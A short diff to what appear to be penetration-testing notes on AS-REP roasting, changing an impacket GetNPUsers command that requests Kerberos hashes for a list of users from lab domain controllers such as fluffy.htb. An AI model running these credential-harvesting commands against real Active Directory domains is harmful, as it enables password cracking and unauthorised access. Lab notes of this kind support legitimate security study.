@@ -18,7 +18,7 @@ impacket-GetNPUsers -dc-ip 10.10.18.74 "spookysec.local/svc-admin" -no-pass
 With multiple users We can create a users’ list `users.txt`, and then use the impacket `GetNPUsers.py` script to perform kerberoasting.
 
 ```
-impacketGetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py fluffy.htb/ -usersfile users.txt -dc-ip 10.129.19.236
 ```
 ## Internal ASREP-Roasting
 
